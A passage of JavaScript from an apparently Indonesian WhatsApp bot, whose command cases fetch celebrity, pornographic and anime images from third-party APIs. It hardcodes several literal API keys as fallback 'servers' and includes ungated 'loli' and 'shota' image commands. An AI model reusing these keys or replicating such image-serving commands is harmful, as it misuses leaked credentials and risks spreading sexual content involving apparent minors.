let cecan = await getBuffer(`https://api.zeeoneofc.my.id/api/cecan/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
//cogan
case'wuyifan': case'suga': case'parkchanyeol': case'ohsehun': case'luhan': case'kimtaehyung': case'kimsoek': case'kimnanjoon': case'kimminseok': case'kimjunmyeon': case'kimjong': case'kimjondae': case'jungkook': case'jimin': case'jhope': case'huangzitao': case'dohkyungsoo': case'baekhyung':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: cogan, caption: 'Nih Kak Cowok Gantengnya 😋'},{quoted: m})
}
break
//nsfw
case'baka':case'smug':case'neko_sfw':case'hentai_gif':case'spank':case'blowjob':case'cumarts':case'eroyuri':case'eroneko':case'erokemonomimi':case'erokitsune':case'ero':case'feet':case'erofeet':case'feetgif':case'femdom':case'futanari':case'hentai':case'holoero':case'holo':case'keta':case'kitsune':case'kemonomimi':case'pussyart':case'pussywankgif':case'girl_solo':case'girl_solo_gif':case'tits':case'trap':case'yuri':case'avatar2':case'anal':case'bj':case'boobs':case'classic':case'cumsluts':case'kuni':case'lesbian':case'neko':case'neko_gif':case'ahegao':case'bdsm':case'cuckold':case'cum':case'foot':case'gangbang':case'glasses':case'jahy':case'masturbation':case'nsfw_neko':case'orgy':case'panties':case'tentacles':case'thighs':case'zettai':
try{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup)return newReply(mess.OnlyGrup)
if (!isCreator&&!isPremium) return newReply('Fitur khusus user premium!')
if (!isNsfw && !m.key.fromMe && !isCreator) return newReply('Fitur nsfw belum di aktifkan')
newReply(mess.wait)
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}catch (error) {
  newReply('Server 1 down,menghububgkan ke server ke dua')
  
 // JzhSmQ4Y5AerDXy && Ya8mZzbY6hsNFR4 && ZFBsbrJfud5RA3g && MCkII8DRUo95Uo6
}try{
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=JzhSmQ4Y5AerDXy`)
await juna.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}catch (error) {
  newReply ('Server 2 down,menghubungkan ke server ke 3')
}try {
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=Ya8mZzbY6hsNFR4`)
await juna.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}catch (error) {
  newReply('Server 3 Down,menghubungkan ke server ke 4')
}try {
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=MCkII8DRUo95Uo6`)
await juna.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}catch (error) {
  newReply('Semua server sedang down,silahkan menghubungi owner untuk melakukan perbaikan\Ketik .owner')
}
break
// Random Anime
case 'akira': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { akira } = require('./datanya/anime/akira') 
let akiranya = akira[Math.floor(Math.random() * akira.length)]
juna.sendMessage(m.chat, { image: { url: akiranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'akiyama': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { akiyama } = require('./datanya/anime/akiyama') 
let akiyamanya = akiyama[Math.floor(Math.random() * akiyama.length)]
juna.sendMessage(m.chat, { image: { url: akiyamanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'ana': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { ana } = require('./datanya/anime/ana') 
let ananya = ana[Math.floor(Math.random() * ana.length)]
juna.sendMessage(m.chat, { image: { url: ananya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'asuna': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { asuna } = require('./datanya/anime/asuna') 
let asunanya = asuna[Math.floor(Math.random() * asuna.length)]
juna.sendMessage(m.chat, { image: { url: asunanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'ayuzawa': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { ayuzawa } = require('./datanya/anime/ayuzawa') 
let ayuzawanya = ayuzawa[Math.floor(Math.random() * ayuzawa.length)]
juna.sendMessage(m.chat, { image: { url: ayuzawanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'boruto': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { boruto } = require('./datanya/anime/boruto') 
let borutonya = boruto[Math.floor(Math.random() * boruto.length)]
juna.sendMessage(m.chat, { image: { url: borutonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'chitanda': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { chitanda } = require('./datanya/anime/chitanda') 
let chitandanya = chitanda[Math.floor(Math.random() * chitanda.length)]
juna.sendMessage(m.chat, { image: { url: chitandanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'deidara': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { deidara } = require('./datanya/anime/deidara') 
let deidaranya = deidara[Math.floor(Math.random() * deidara.length)]
juna.sendMessage(m.chat, { image: { url: deidaranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'doraemon': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { doraemon } = require('./datanya/anime/doraemon') 
let doraemonnya = doraemon[Math.floor(Math.random() * doraemon.length)]
juna.sendMessage(m.chat, { image: { url: doraemonnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'elaina': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { elaina } = require('./datanya/anime/elaina') 
let elainanya = elaina[Math.floor(Math.random() * elaina.length)]
juna.sendMessage(m.chat, { image: { url: elainanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'emilia': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { emilia } = require('./datanya/anime/emilia') 
let emilianya = emilia[Math.floor(Math.random() * emilia.length)]
juna.sendMessage(m.chat, { image: { url: emilianya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'erza': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { erza } = require('./datanya/anime/erza') 
let erzanya = erza[Math.floor(Math.random() * erza.length)]
juna.sendMessage(m.chat, { image: { url: erzanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'fanart': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { fanart } = require('./datanya/anime/fanart') 
let fanartnya = fanart[Math.floor(Math.random() * fanart.length)]
juna.sendMessage(m.chat, { image: { url: fanartnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'genshin': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { genshin } = require('./datanya/anime/genshin') 
let genshinnya = genshin[Math.floor(Math.random() * genshin.length)]
juna.sendMessage(m.chat, { image: { url: genshinnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'gremory': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { gremory } = require('./datanya/anime/gremory') 
let gremorynya = gremory[Math.floor(Math.random() * gremory.length)]
juna.sendMessage(m.chat, { image: { url: gremorynya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'hestia': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { hestia } = require('./datanya/anime/hestia') 
let hestianya = hestia[Math.floor(Math.random() * hestia.length)]
juna.sendMessage(m.chat, { image: { url: hestianya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'hinata': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { hinata } = require('./datanya/anime/hinata') 
let hinatanya = hinata[Math.floor(Math.random() * hinata.length)]
juna.sendMessage(m.chat, { image: { url: hinatanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'husbu': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { husbu } = require('./datanya/anime/husbu') 
let husbunya = husbu[Math.floor(Math.random() * husbu.length)]
juna.sendMessage(m.chat, { image: { url: husbunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'icon': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { icon } = require('./datanya/anime/icon') 
let iconnya = icon[Math.floor(Math.random() * icon.length)]
juna.sendMessage(m.chat, { image: { url: iconnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'inori': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { inori } = require('./datanya/anime/inori') 
let inorinya = inori[Math.floor(Math.random() * inori.length)]
juna.sendMessage(m.chat, { image: { url: inorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'isuzu': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { isuzu } = require('./datanya/anime/isuzu') 
let isuzunya = isuzu[Math.floor(Math.random() * isuzu.length)]
juna.sendMessage(m.chat, { image: { url: isuzunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'itachi': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { itachi } = require('./datanya/anime/itachi') 
let itachinya = itachi[Math.floor(Math.random() * itachi.length)]
juna.sendMessage(m.chat, { image: { url: itachinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'itori': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { itori } = require('./datanya/anime/itori') 
let itorinya = itori[Math.floor(Math.random() * itori.length)]
juna.sendMessage(m.chat, { image: { url: itorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'fiturdongo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kaga } = require('./datanya/anime/kaga') 
let kaganya = kaga[Math.floor(Math.random() * kaga.length)]
juna.sendMessage(m.chat, { image: { url: kaganya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'kagura': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kagura } = require('./datanya/anime/kagura') 
let kaguranya = kagura[Math.floor(Math.random() * kagura.length)]
juna.sendMessage(m.chat, { image: { url: kaguranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaguya': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kaguya } = require('./datanya/anime/kaguya') 
let kaguyanya = kaguya[Math.floor(Math.random() * kaguya.length)]
juna.sendMessage(m.chat, { image: { url: kaguyanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kakasih': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kakasih } = require('./datanya/anime/kakasih') 
let kakasihnya = kakasih[Math.floor(Math.random() * kakasih.length)]
juna.sendMessage(m.chat, { image: { url: kakasihnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaneki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kaneki } = require('./datanya/anime/kaneki') 
let kanekinya = kaneki[Math.floor(Math.random() * kaneki.length)]
juna.sendMessage(m.chat, { image: { url: kanekinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kaori': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kaori } = require('./datanya/anime/kaori') 
let kaorinya = kaori[Math.floor(Math.random() * kaori.length)]
juna.sendMessage(m.chat, { image: { url: kaorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'keneki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { keneki } = require('./datanya/anime/keneki') 
let kenekinya = keneki[Math.floor(Math.random() * keneki.length)]
juna.sendMessage(m.chat, { image: { url: kenekinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kosaki': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kosaki } = require('./datanya/anime/kosaki') 
let kosakinya = kosaki[Math.floor(Math.random() * kosaki.length)]
juna.sendMessage(m.chat, { image: { url: kosakinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kotori': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kotori } = require('./datanya/anime/kotori') 
let kotorinya = kotori[Math.floor(Math.random() * kotori.length)]
juna.sendMessage(m.chat, { image: { url: kotorinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kuriyama': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kuriyama } = require('./datanya/anime/kuriyama') 
let kuriyamanya = kuriyama[Math.floor(Math.random() * kuriyama.length)]
juna.sendMessage(m.chat, { image: { url: kuriyamanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kuroha': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kuroha } = require('./datanya/anime/kuroha') 
let kurohanya = kuroha[Math.floor(Math.random() * kuroha.length)]
juna.sendMessage(m.chat, { image: { url: kurohanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'kurumi': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { kurumi } = require('./datanya/anime/kurumi') 
let kuruminya = kurumi[Math.floor(Math.random() * kurumi.length)]
juna.sendMessage(m.chat, { image: { url: kuruminya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'loli': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
juna.sendMessage(m.chat, { image: { url: 'https://skizo.tech/api/loli?apikey=chiwa' }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'madara': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { madara } = require('./datanya/anime/madara') 
let madaranya = madara[Math.floor(Math.random() * madara.length)]
juna.sendMessage(m.chat, { image: { url: madaranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'megumin': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { megumin } = require('./datanya/anime/megumin') 
let meguminnya = megumin[Math.floor(Math.random() * megumin.length)]
juna.sendMessage(m.chat, { image: { url: meguminnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'menus': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { menus } = require('./datanya/anime/menus') 
let menusnya = menus[Math.floor(Math.random() * menus.length)]
juna.sendMessage(m.chat, { image: { url: menusnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'mikasa': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { mikasa } = require('./datanya/anime/mikasa') 
let mikasanya = mikasa[Math.floor(Math.random() * mikasa.length)]
juna.sendMessage(m.chat, { image: { url: mikasanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'miku': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { miku } = require('./datanya/anime/miku') 
let mikunya = miku[Math.floor(Math.random() * miku.length)]
juna.sendMessage(m.chat, { image: { url: mikunya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'minato': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { minato } = require('./datanya/anime/minato') 
let minatonya = minato[Math.floor(Math.random() * minato.length)]
juna.sendMessage(m.chat, { image: { url: minatonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'naruto': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { naruto } = require('./datanya/anime/naruto') 
let narutonya = naruto[Math.floor(Math.random() * naruto.length)]
juna.sendMessage(m.chat, { image: { url: narutonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'natsukawa': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { natsukawa } = require('./datanya/anime/natsukawa') 
let natsukawanya = natsukawa[Math.floor(Math.random() * natsukawa.length)]
juna.sendMessage(m.chat, { image: { url: natsukawanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'nezuko': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { nezuko } = require('./datanya/anime/nezuko') 
let nezukonya = nezuko[Math.floor(Math.random() * nezuko.length)]
juna.sendMessage(m.chat, { image: { url: nezukonya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'nishimiya': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { nishimiya } = require('./datanya/anime/nishimiya') 
let nishimiyanya = nishimiya[Math.floor(Math.random() * nishimiya.length)]
juna.sendMessage(m.chat, { image: { url: nishimiyanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'onepiece': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { onepiece } = require('./datanya/anime/onepiece') 
let onepiecenya = onepiece[Math.floor(Math.random() * onepiece.length)]
juna.sendMessage(m.chat, { image: { url: onepiecenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'pokemon': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { pokemon } = require('./datanya/anime/pokemon') 
let pokemonnya = pokemon[Math.floor(Math.random() * pokemon.length)]
juna.sendMessage(m.chat, { image: { url: pokemonnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'rem': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { rem } = require('./datanya/anime/rem') 
let remnya = rem[Math.floor(Math.random() * rem.length)]
juna.sendMessage(m.chat, { image: { url: remnya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'rize': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { rize } = require('./datanya/anime/rize') 
let rizenya = rize[Math.floor(Math.random() * rize.length)]
juna.sendMessage(m.chat, { image: { url: rizenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sagiri': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { sagiri } = require('./datanya/anime/sagiri') 
let sagirinya = sagiri[Math.floor(Math.random() * sagiri.length)]
juna.sendMessage(m.chat, { image: { url: sagirinya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sakura': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { sakura } = require('./datanya/anime/sakura') 
let sakuranya = sakura[Math.floor(Math.random() * sakura.length)]
juna.sendMessage(m.chat, { image: { url: sakuranya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sasuke': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { sasuke } = require('./datanya/anime/sasuke') 
let sasukenya = sasuke[Math.floor(Math.random() * sasuke.length)]
juna.sendMessage(m.chat, { image: { url: sasukenya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shina': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { shina } = require('./datanya/anime/shina') 
let shinanya = shina[Math.floor(Math.random() * shina.length)]
juna.sendMessage(m.chat, { image: { url: shinanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shinka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { shinka } = require('./datanya/anime/shinka') 
let shinkanya = shinka[Math.floor(Math.random() * shinka.length)]
juna.sendMessage(m.chat, { image: { url: shinkanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shizuka': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { shizuka } = require('./datanya/anime/shizuka') 
let shizukanya = shizuka[Math.floor(Math.random() * shizuka.length)]
juna.sendMessage(m.chat, { image: { url: shizukanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'shota': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { shota } = require('./datanya/anime/shota') 
let shotanya = shota[Math.floor(Math.random() * shota.length)]
juna.sendMessage(m.chat, { image: { url: shotanya }, caption: `Random ${command}`}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'simp': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
